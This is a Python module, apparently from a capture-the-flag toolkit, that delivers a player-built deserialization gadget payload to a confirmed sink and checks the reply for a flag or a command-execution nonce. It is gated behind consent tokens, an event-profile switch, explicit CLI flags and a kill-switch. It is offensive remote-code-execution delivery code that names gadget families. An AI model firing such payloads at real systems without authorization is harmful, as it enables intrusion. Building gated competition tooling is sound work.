#!/usr/bin/env python3
"""deser_fire: the native-deserialization GADGET-FIRING engine (B-121).

Detection (`deser_detect.py`) and payload GENERATION (`deser_gadgets.py`,
`deserialization_chains.py`, `webdeser2_preconditions.py`, `solvers/toolkits/java_deser.py`) are
already built, and they are COLD: they recognize a serialized blob and build reviewable, NON-EXECUTED
candidate chains. The one half that was always left to the player by hand is the FIRE step: delivering
a chosen gadget to a confirmed deserialization sink and reading back proof. Firing a gadget chain IS
remote code execution, so it is safety-gated and reserved to the offensive/player channel; it can
never be a default, auto-run action.

This module fills that fire half, and ONLY the fire half, behind an explicit gate:

  * It is NEVER auto-fired. It has no ``signals()``/``solve_set()`` and is not a solver, so triage
    never runs it (exactly like `deser_detect.py` and `pwn_exploit.py`; its manifest route is a
    narrow keyword nudge that only SUGGESTS it). The one firing entry, :func:`fire`, refuses unless
    the caller passes a :class:`ConsentToken` built by :func:`arm` (``FireNotArmed`` otherwise).
    Triage code never calls :func:`arm`, so it can never fire by accident.
  * Firing a gadget is RCE, which changes the target's state whatever the HTTP verb, so it also
    obeys the web lane's single O-2 switch: :func:`fire` refuses (``FireRefused``) unless the active
    event profile sets ``rules.web_state_changing = true``, and fails closed with a named reason when
    no profile loads (docs/CONTRACTS.md, event profile). An operator kill-switch
    (``CTF_WEB_DESER_FIRE=off``) additionally forbids firing even when both are given.
  * It GENERATES NO gadget. Building an RCE chain stays in the cold generators above (blocked on the
    offensive classifier). :func:`fire` consumes a gadget payload the player already generated and
    chose; with no payload it refuses, naming the cold generator to use. It never synthesizes RCE,
    never deserializes anything, and never executes a challenge binary -- it only puts the player's
    bytes on the wire through an injected, scope-locked transport and scans the untrusted response as
    data.
  * It is ONE BOUNDED attempt. A GET-first control read establishes the baseline (it is mandatory:
    ``max_requests`` below 2 is refused, since without it a decoy could be claimed), then exactly one
    fire request is sent. A payoff is RETURNED for the player to submit, NEVER auto-submitted.
  * RCE is confirmed only by a nonce that the gadget's OUTPUT carries and the request does not: a
    nonce found literally in anything sent (raw payload, any encoding stage, path, body, headers) is
    indistinguishable from a server that merely reflects the request, so it never confirms.

Public API:

    arm(reason) -> ConsentToken               explicit, logged consent to fire (the offensive gate)
    family_for(detection_or_format) -> str     map a `deser_detect` finding/format to a gadget family
    plan(detection, *, sink=None, want_family=None) -> dict
                                               COLD: which family, which cold generator, how the blob
                                               would ride the sink. No network, nothing fired.
    fire(target, *, detection, payload, sink, consent, proof_nonce=None, max_requests=2) -> dict
                                               the GATED fire: deliver `payload` to `sink` once and
                                               read back proof. Requires a ConsentToken.

`target` is any object with a `.request(method, path, data=None, headers=None, allow_redirects=True)
-> {"status", "body", ...}` -- the scope-locked `solvers/toolkits/web.py` WebClient in production, a
loopback fake in tests. `sink` is a descriptor {method, path, where, name, encoding, ...}; see
:func:`fire`. `detection` is a `deser_detect` finding dict (or a bare format string).

CLI (plan is cold and always available; firing demands two explicit flags):

    .venv/bin/python solvers/web/deser_fire.py plan  <format> [--sink SINK.json]
    .venv/bin/python solvers/web/deser_fire.py fire  --target URL --sink SINK.json \
        --payload GADGET.bin [--format FMT] [--nonce NONCE] --fire --i-understand-this-is-rce
"""
from __future__ import annotations

import argparse
import base64
import binascii
import gzip
import json
import os
import sys
import urllib.parse
import zlib
from pathlib import Path

# ctf package import (a file run needs the checkout root on sys.path).
try:
    from ctf import env, flagfmt
    from ctf import event as _event
except ModuleNotFoundError:  # pragma: no cover - path shim for `python solvers/web/deser_fire.py`
    sys.path.append(str(Path(__file__).resolve().parents[2]))
    from ctf import env, flagfmt
    from ctf import event as _event

# deser_detect is a sibling; load it by file so this module imports from any export layout, exactly as
# the web tests load their solver. It is READ-ONLY and never deserializes -- we reuse it to confirm the
# player's payload really is the wire format its sink expects (so a mismatched blob is refused, not fired).
_HERE = Path(__file__).resolve().parent
if str(_HERE) not in sys.path:
    sys.path.insert(0, str(_HERE))
import deser_detect as _detect  # noqa: E402


MAX_PAYLOAD = 8 * 1024 * 1024          # bytes of one gadget payload delivered
MAX_BODY = 4 * 1024 * 1024             # bytes of a response scanned for proof
ALLOWED_METHODS = frozenset({"GET", "POST", "HEAD", "OPTIONS"})
DESTRUCTIVE_METHODS = frozenset({"PUT", "PATCH", "DELETE", "TRACE", "CONNECT"})
FIRE_KILL_ENV = "CTF_WEB_DESER_FIRE"   # set to off/0/false/no to forbid firing globally

# A `deser_detect` format -> the gadget family whose generator and sink delivery apply.
FAMILY_BY_FORMAT = {
    "java_serialized_stream": "java",
    "ruby_marshal": "ruby",
    "dotnet_binaryformatter": "dotnet",
    "aspnet_viewstate": "dotnet",
    "python_pickle": "python",
    "jsonpickle": "python",
    "php_object_injection": "php",
    "php_serialized": "php",
    "node_serialize": "node",
    "unsafe_yaml": "yaml",
}
FAMILIES = tuple(dict.fromkeys(FAMILY_BY_FORMAT.values()))

# Which COLD generator builds a chain for each family. Firing never runs these; it names them so the
# player knows where the payload comes from. All of them build NON-EXECUTED candidate bytes.
GENERATOR_BY_FAMILY = {
    "java": "solvers/toolkits/java_deser.py (ysoserial gadget chains; needs docker/java) -- COLD",
    "python": "solvers/web/deser_gadgets.py synthesize(..., language='python') / deserialization_chains -- COLD",
    "php": "solvers/web/deser_gadgets.py php_magic_chains / php_serialize_object -- COLD",
    "ruby": "solvers/web/deser_gadgets.py (ruby) / deserialization_chains ruby_marshal|ruby_erb -- COLD",
    "dotnet": "ysoserial.net gadget chains (ObjectDataProvider/TypeNameHandling) -- COLD",
    "node": "node-serialize _$$ND_FUNC$$_ IIFE gadget -- COLD",
    "yaml": "deser_gadgets / SnakeYAML|PyYAML unsafe-tag payload -- COLD",
}


class DeserFireError(ValueError):
    """A malformed or out-of-contract fire input (bad sink, bad verb, oversize payload)."""


class FireNotArmed(RuntimeError):
    """fire() was called without a ConsentToken: firing is RCE and is never auto-invoked."""


class FireRefused(RuntimeError):
    """A fire attempt is refused for a NAMED reason (kill-switch off, missing payload, family
    mismatch, destructive verb). No silent fallback: nothing is sent."""


class ConsentToken:
    """Explicit, logged consent to fire one gadget. Built only by :func:`arm`; :func:`fire` refuses
    without one. Triage never constructs this, so firing can never happen on the auto path."""

    __slots__ = ("reason",)

    def __init__(self, reason: str, _key: object) -> None:
        if _key is not _ARM_KEY:
            raise FireNotArmed("build consent with deser_fire.arm(reason), not ConsentToken() directly")
        self.reason = reason


_ARM_KEY = object()


def arm(reason: str) -> ConsentToken:
    """Record the player's explicit decision to fire and return the token :func:`fire` requires.
    `reason` is a non-empty note (the scope/authorization the player is acting under)."""
    if not isinstance(reason, str) or not reason.strip():
        raise FireNotArmed("arm(reason) needs a non-empty reason (your scope/authorization to fire)")
    return ConsentToken(reason.strip()[:512], _ARM_KEY)


def _kill_switch_off() -> bool:
    """True when an operator has globally forbidden firing (CTF_WEB_DESER_FIRE in off/0/false/no)."""
    val = env.get(FIRE_KILL_ENV)
    return isinstance(val, str) and val.strip().lower() in {"off", "0", "false", "no", "disable", "disabled"}


# --------------------------------------------------------------------------------------------------
#  family mapping + cold plan
# --------------------------------------------------------------------------------------------------

def _format_of(detection) -> str:
    if isinstance(detection, str):
        return detection
    if isinstance(detection, dict):
        fmt = detection.get("format")
        if isinstance(fmt, str):
            return fmt
    raise DeserFireError("detection must be a deser_detect finding dict or a format string")


def family_for(detection_or_format) -> str:
    """The gadget family for a `deser_detect` finding (or a bare format string). Raises for an
    unknown or non-serialized format -- no silent default (rule 6)."""
    fmt = _format_of(detection_or_format)
    family = FAMILY_BY_FORMAT.get(fmt)
    if family is None:
        raise DeserFireError(
            f"no gadget family maps to format {fmt!r}; known formats: {sorted(FAMILY_BY_FORMAT)}")
    return family


def plan(detection, *, sink=None, want_family=None) -> dict:
    """COLD. Given a detected format (and, optionally, the sink the blob rides), say which gadget
    family fires it, which cold generator builds the chain, and how the payload would be placed on the
    wire. Sends nothing, fires nothing, generates nothing."""
    fmt = _format_of(detection)
    family = want_family or family_for(detection)
    enc = []
    if isinstance(detection, dict):
        enc = list(detection.get("outer_encoding") or [])
    sink_plan = _normalize_sink(sink, default_encoding=enc) if sink is not None else None
    return {
        "format": fmt,
        "family": family,
        "generator": GENERATOR_BY_FAMILY.get(family, "hand-built gadget -- COLD"),
        "fire_entry": "deser_fire.fire(target, detection=..., payload=<cold gadget bytes>, sink=..., "
                      "consent=deser_fire.arm(reason))",
        "sink": sink_plan,
        "gated": True,
        "note": "firing is RCE: generate the chain COLD, then fire ONE bounded attempt behind the "
                "offensive gate. The recovered flag/proof is the player's to submit, never auto.",
    }


# --------------------------------------------------------------------------------------------------
#  wire encoding of the delivered blob (reverse of deser_detect's peel)
# --------------------------------------------------------------------------------------------------

def _enc_one(data: bytes, enc: str) -> bytes:
    if enc == "base64":
        return base64.b64encode(data)
    if enc == "base64url":
        return base64.urlsafe_b64encode(data)
    if enc == "hex":
        return binascii.hexlify(data)
    if enc == "url":
        return urllib.parse.quote_from_bytes(data, safe="").encode("ascii")
    if enc == "gzip":
        return gzip.compress(data, mtime=0)   # deterministic: same gadget -> same wire bytes
    if enc == "zlib":
        return zlib.compress(data)
    raise DeserFireError(f"unknown sink encoding {enc!r}")


def _encode_stages(payload: bytes, encoding) -> list[bytes]:
    """[raw, after the innermost encoding, ..., the wire bytes]. `encoding` is OUTERMOST-FIRST."""
    stages = [bytes(payload)]
    for enc in reversed(list(encoding or [])):
        stages.append(_enc_one(stages[-1], enc))
    return stages


def encode_for_sink(payload: bytes, encoding) -> bytes:
    """Wrap raw gadget bytes in the transport encodings the sink expects. `encoding` is listed
    OUTERMOST-FIRST, the order deser_detect records in a finding's ``outer_encoding`` (a captured
    base64(gzip(pickle)) peels as ['base64', 'gzip']), so that chain passes straight through: the
    list is applied in reverse, innermost (last) first, giving base64(gzip(raw))."""
    return _encode_stages(payload, encoding)[-1]


# --------------------------------------------------------------------------------------------------
#  sink descriptor
# --------------------------------------------------------------------------------------------------

_WHERE = frozenset({"cookie", "param", "body-form", "body-raw", "header"})


def _normalize_sink(sink, *, default_encoding=None) -> dict:
    if not isinstance(sink, dict):
        raise DeserFireError("sink must be a dict {method, path, where, name, encoding}")
    method = str(sink.get("method", "GET")).upper()
    if method in DESTRUCTIVE_METHODS:
        raise FireRefused(f"sink verb {method} is destructive; only GET/POST deliver a deser blob")
    if method not in ALLOWED_METHODS:
        raise DeserFireError(f"sink method {method!r} is not one of {sorted(ALLOWED_METHODS)}")
    where = str(sink.get("where", "cookie")).lower()
    if where not in _WHERE:
        raise DeserFireError(f"sink where {where!r} must be one of {sorted(_WHERE)}")
    path = str(sink.get("path", "/"))
    if not path.startswith("/"):
        raise DeserFireError("sink path must be an absolute path beginning with '/'")
    name = sink.get("name")
    if where in {"cookie", "param", "body-form", "header"} and not name:
        raise DeserFireError(f"sink where={where} needs a 'name' (the cookie/param/field/header name)")
    if where == "body-raw" and method == "GET":
        raise DeserFireError("where=body-raw needs a POST sink (a GET carries no body)")
    encoding = sink.get("encoding")
    if encoding is None:
        encoding = list(default_encoding or [])
    if not isinstance(encoding, (list, tuple)):
        raise DeserFireError("sink encoding must be a list of transport encodings")
    return {"method": method, "path": path, "where": where, "name": name,
            "encoding": list(encoding),
            "extra_params": dict(sink.get("extra_params") or {}),
            "headers": dict(sink.get("headers") or {})}


def _build_request(sink: dict, wire: bytes):
    """Return (method, path, data, headers) placing `wire` (the encoded blob) at the sink."""
    method, where, name = sink["method"], sink["where"], sink["name"]
    path, headers, data = sink["path"], dict(sink["headers"]), None
    wire_text = wire.decode("latin-1")
    if where == "cookie":
        prior = headers.get("Cookie")
        cookie = f"{name}={wire_text}"
        headers["Cookie"] = f"{prior}; {cookie}" if prior else cookie
    elif where == "header":
        headers[name] = wire_text
    elif where == "param":
        params = dict(sink["extra_params"])
        params[name] = wire_text
        path = f"{path}{'&' if '?' in path else '?'}{urllib.parse.urlencode(params)}"
    elif where == "body-form":
        form = dict(sink["extra_params"])
        form[name] = wire_text
        data = urllib.parse.urlencode(form).encode("ascii")
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif where == "body-raw":
        data = wire
        headers.setdefault("Content-Type", "application/octet-stream")
    return method, path, data, headers


# --------------------------------------------------------------------------------------------------
#  proof confirmation (self-proving; one-proof rule; never auto-submitted)
# --------------------------------------------------------------------------------------------------

def _state_gate() -> tuple[bool, str]:
    """``(allowed, reason)`` from the active event profile's ``rules.web_state_changing`` -- the web
    lane's single O-2 switch (docs/CONTRACTS.md). Firing a gadget is RCE, so every fire is
    state-changing whatever its verb. Fails CLOSED with a named reason when no profile loads."""
    try:
        profile = _event_profile()
    except Exception as exc:  # EventError, a broken profile: refuse, never fire by default
        return False, f"no event profile loaded ({type(exc).__name__}: {exc}); gadget firing refused"
    slug = getattr(profile, "slug", "?")
    if getattr(getattr(profile, "rules", None), "web_state_changing", False) is True:
        return True, f"event {slug!r} sets web_state_changing=true"
    return False, (f"event {slug!r} sets web_state_changing=false: firing a gadget is RCE (state-"
                   "changing whatever the verb) and needs web_state_changing=true in the event profile")


def _event_profile():
    """The active event profile (a seam the tests inject a profile through)."""
    return _event.current()


def _sent_nonce_site(nonce_b: bytes, stages, path, data, headers):
    """Where the nonce occurs literally in what this fire SENT, or None. A sink that merely reflects
    the request would echo it there, so an echo of such a nonce is no evidence of execution."""
    for i, stage in enumerate(stages):
        if nonce_b in stage:
            return "the raw payload" if i == 0 else f"encoding stage {i} of the wire blob"
    if nonce_b in str(path).encode("utf-8", "replace"):
        return "the request path"
    if data and nonce_b in bytes(data):
        return "the request body"
    for k, v in (headers or {}).items():
        if nonce_b in f"{k}: {v}".encode("utf-8", "replace"):
            return f"request header {k!r}"
    return None


def _payoffs(text) -> list[str]:
    """Distinct payoff tokens in a response -- proofs under a [proof] event, else flags in the event
    format. Response bytes are untrusted DATA: scanned with the event regex only, never executed."""
    ff = flagfmt.current()
    found = ff.find_proofs(text) if flagfmt.has_proof() else ff.find_flags(text)
    return list(dict.fromkeys(found))


def _body_of(resp) -> bytes:
    if isinstance(resp, dict):
        body = resp.get("body", b"")
    else:
        body = getattr(resp, "body", b"")
    if isinstance(body, str):
        body = body.encode("utf-8", "replace")
    return bytes(body or b"")[:MAX_BODY]


# --------------------------------------------------------------------------------------------------
#  the gated fire
# --------------------------------------------------------------------------------------------------

def fire(target, *, detection, payload, sink, consent, proof_nonce=None, max_requests=2) -> dict:
    """Deliver ONE gadget `payload` to the confirmed deserialization `sink` through `target` and read
    back proof. GATED: `consent` must be a ConsentToken from :func:`arm`, or ``FireNotArmed`` is
    raised and nothing is sent.

    target      : an object with `.request(method, path, data=None, headers=None, allow_redirects=
                  True) -> {"status", "body", ...}` (the scope-locked WebClient, or a loopback fake).
    detection   : the `deser_detect` finding (or format string) naming the wire format.
    payload     : the RAW gadget bytes the player generated COLD. Firing never builds this.
    sink        : {method, path, where, name, encoding, extra_params, headers}. `where` is one of
                  cookie|param|body-form|body-raw|header. `encoding` wraps the blob for the wire,
                  OUTERMOST-FIRST (deser_detect's ``outer_encoding`` order); when the sink omits it,
                  the detection dict's ``outer_encoding`` is used.
    proof_nonce : optional marker that a command-exec gadget's OUTPUT carries; the fire is confirmed
                  as RCE when it appears in the fire response, NOT the control, and NOT anywhere in
                  the request. Make the gadget compute it (`echo $((A*B))`, `rev`, a hash) and pass
                  the expected OUTPUT here: a nonce sent literally (`echo NONCE`) cannot be told from
                  a reflecting server, so it never confirms (evidence says why).
    max_requests: at most this many requests (control GET + one fire). Default 2; below 2 is
                  refused because the control read is what rules out decoys.

    Returns {fired, family, proof, proof_kind, rce_confirmed, requests, evidence, sink, note}. `proof`
    is the single payoff recovered from the fire (never on the control), else None; it is the player's
    to submit and is NEVER auto-submitted. Two distinct payoffs -> None (ambiguous)."""
    if not isinstance(consent, ConsentToken):
        raise FireNotArmed(
            "fire() needs explicit consent: pass consent=deser_fire.arm('<your scope/authorization>'). "
            "Firing a gadget chain is RCE and is never auto-invoked.")
    if _kill_switch_off():
        raise FireRefused(f"{FIRE_KILL_ENV} forbids firing; unset it to allow the gated fire")
    allowed, why = _state_gate()
    if not allowed:
        raise FireRefused(why)
    try:
        budget = int(max_requests)
    except (TypeError, ValueError):
        raise DeserFireError(f"max_requests must be an integer, got {max_requests!r}") from None
    if budget < 2:
        raise DeserFireError(
            f"max_requests={budget} leaves no room for the GET-first control read; a fire without it "
            "could claim a decoy the plain page shows anyway. Use max_requests >= 2.")
    if not isinstance(payload, (bytes, bytearray)) or not payload:
        family = family_for(detection)
        raise FireRefused(
            f"no gadget payload to fire; build one COLD ({GENERATOR_BY_FAMILY.get(family, 'the cold generator')}) "
            "and pass it as payload. Firing never auto-generates RCE.")
    if len(payload) > MAX_PAYLOAD:
        raise DeserFireError(f"payload exceeds {MAX_PAYLOAD} bytes")

    family = family_for(detection)
    sink = _normalize_sink(sink, default_encoding=(detection.get("outer_encoding")
                                                   if isinstance(detection, dict) else None))

    # Confirm the player's payload really is this family's wire format before firing it. deser_detect
    # is a pure byte test (it deserializes nothing); a mismatch means the wrong gadget -- refuse.
    recognized = _detect.detect(bytes(payload))
    fams = {FAMILY_BY_FORMAT.get(f.get("format")) for f in recognized}
    if family not in fams:
        raise FireRefused(
            f"payload is not a recognizable {family} serialized blob (deser_detect saw "
            f"{sorted(x for x in fams if x)}); fire the gadget that matches the detected sink.")

    evidence: list[str] = []
    requests = 0

    # (1) GET-first control: the baseline page, so a payoff the site shows anyway can never be claimed.
    control = target.request("GET", sink["path"], data=None, headers=dict(sink["headers"]),
                             allow_redirects=True)
    requests += 1
    control_body = _body_of(control)
    control_payoffs = set(_payoffs(control_body))
    control_has_nonce = bool(proof_nonce) and proof_nonce.encode("utf-8", "replace") in control_body

    # (2) the ONE fire request.
    stages = _encode_stages(bytes(payload), sink["encoding"])
    wire = stages[-1]
    method, path, data, headers = _build_request(sink, wire)
    if method in DESTRUCTIVE_METHODS:  # defensive; _normalize_sink already refused these
        raise FireRefused(f"refusing destructive verb {method}")
    resp = target.request(method, path, data=data, headers=headers, allow_redirects=True)
    requests += 1
    fire_body = _body_of(resp)
    status = resp.get("status") if isinstance(resp, dict) else getattr(resp, "status", None)

    # Proof: a payoff on the fire response that was NOT on the control (self-proving; decoy-proof).
    fire_payoffs = [p for p in _payoffs(fire_body) if p not in control_payoffs]
    proof = None
    proof_kind = None
    if len(fire_payoffs) == 1:
        proof, proof_kind = fire_payoffs[0], "payoff"
    elif len(fire_payoffs) > 1:
        evidence.append(f"ambiguous: {len(fire_payoffs)} distinct payoff tokens on the fire response "
                        "-- not claimed")

    rce_confirmed = False
    if proof_nonce:
        nonce_b = proof_nonce.encode("utf-8", "replace")
        sent_at = _sent_nonce_site(nonce_b, stages, path, data, headers)
        if nonce_b in fire_body and sent_at is not None:
            evidence.append(
                f"nonce {proof_nonce!r} echoed, but it was SENT literally in {sent_at}: a server that "
                "reflects the request would echo it too -- RCE NOT confirmed. Make the gadget print a "
                "computed marker (e.g. `echo $((A*B))`) and pass the expected output as proof_nonce.")
        elif nonce_b in fire_body and not control_has_nonce:
            rce_confirmed = True
            evidence.append(f"command-exec nonce {proof_nonce!r} echoed by the sink (RCE confirmed)")
            if proof is None and proof_kind is None:
                proof_kind = "rce-nonce"

    for p in _payoffs(fire_body):
        if p in control_payoffs:
            evidence.append(f"payoff {p!r} also on the plain control page -- decoy, not claimed")

    return {
        "fired": True,
        "family": family,
        "status": status,
        "proof": proof,
        "proof_kind": proof_kind,
        "rce_confirmed": rce_confirmed,
        "requests": requests,
        "evidence": evidence,
        "sink": {"method": sink["method"], "path": sink["path"], "where": sink["where"],
                 "name": sink["name"], "encoding": sink["encoding"]},
        "consent_reason": consent.reason,
        "note": "a recovered flag/proof is the player's to submit; this engine never auto-submits.",
    }


# --------------------------------------------------------------------------------------------------
#  CLI
# --------------------------------------------------------------------------------------------------

def _load_sink(arg):
    if not arg:
        return None
    p = Path(arg)
    text = p.read_text() if p.exists() else arg
    return json.loads(text)


def _cmd_plan(args) -> int:
    out = plan(args.format, sink=_load_sink(args.sink), want_family=args.family)
    print(json.dumps(out, indent=2))
    return 0


def _cmd_fire(args) -> int:
    sink = _load_sink(args.sink)
    fmt = args.format or (sink.get("format") if isinstance(sink, dict) else None)
    if not fmt:
        print("fire: need --format (or 'format' in the sink JSON) naming the detected wire format",
              file=sys.stderr)
        return 64
    if not (args.fire and args.i_understand_this_is_rce):
        # Default: never fire. Print the cold plan and name the gate.
        print("REFUSED: firing is RCE and off by default. Re-run with BOTH --fire and "
              "--i-understand-this-is-rce once you have scope authorization.\nCold plan:")
        print(json.dumps(plan(fmt, sink=sink), indent=2))
        return 3
    if not args.payload:
        print("fire: --payload GADGET.bin is required (the cold-generated gadget bytes)", file=sys.stderr)
        return 64
    if args.max_requests < 2:
        print("fire: --max-requests must be >= 2 (the GET-first control read is mandatory)",
              file=sys.stderr)
        return 64
    allowed, why = _state_gate()
    if not allowed:  # refuse before any client exists
        print(f"REFUSED: {why}")
        return 3
    payload = Path(args.payload).read_bytes()
    # Build the scope-locked transport only here, inside the gate. web.py enforces the live-service
    # scope before any socket opens; a test never reaches this branch (it calls fire() directly).
    sys.path.insert(0, str(_HERE.parent / "toolkits"))
    import web as _web  # noqa: E402  scope-locked WebClient
    client = _web.WebClient(args.target)
    consent = arm(args.reason or f"CLI fire at {args.target} (operator-authorized)")
    try:
        result = fire(client, detection=fmt, payload=payload, sink=sink, consent=consent,
                      proof_nonce=args.nonce, max_requests=args.max_requests)
    except (FireRefused, FireNotArmed, DeserFireError) as exc:
        print(f"REFUSED: {exc}")
        return 3
    print(json.dumps(result, indent=2, default=str))
    return 0 if result.get("proof") or result.get("rce_confirmed") else 1


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Native-deserialization gadget-firing engine (gated).")
    sub = p.add_subparsers(dest="cmd", required=True)

    pp = sub.add_parser("plan", help="COLD: map a detected format to its gadget family and sink plan")
    pp.add_argument("format", help="a deser_detect format (e.g. python_pickle, php_object_injection)")
    pp.add_argument("--sink", help="sink descriptor JSON (file or inline)")
    pp.add_argument("--family", help="override the gadget family")
    pp.set_defaults(func=_cmd_plan)

    pf = sub.add_parser("fire", help="GATED: deliver one gadget to a sink and read back proof")
    pf.add_argument("--target", required=True, help="in-scope target base URL")
    pf.add_argument("--sink", required=True, help="sink descriptor JSON (file or inline)")
    pf.add_argument("--payload", help="file of raw cold-generated gadget bytes")
    pf.add_argument("--format", help="detected wire format (else read from the sink JSON)")
    pf.add_argument("--nonce", help="command-exec marker the gadget echoes (RCE confirmation)")
    pf.add_argument("--reason", help="your scope/authorization note (logged in the consent token)")
    pf.add_argument("--max-requests", type=int, default=2, dest="max_requests")
    pf.add_argument("--fire", action="store_true", help="actually fire (with --i-understand-this-is-rce)")
    pf.add_argument("--i-understand-this-is-rce", action="store_true", dest="i_understand_this_is_rce")
    pf.set_defaults(func=_cmd_fire)
    return p


def main(argv=None) -> int:
    args = build_parser().parse_args(argv if argv is not None else sys.argv[1:])
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
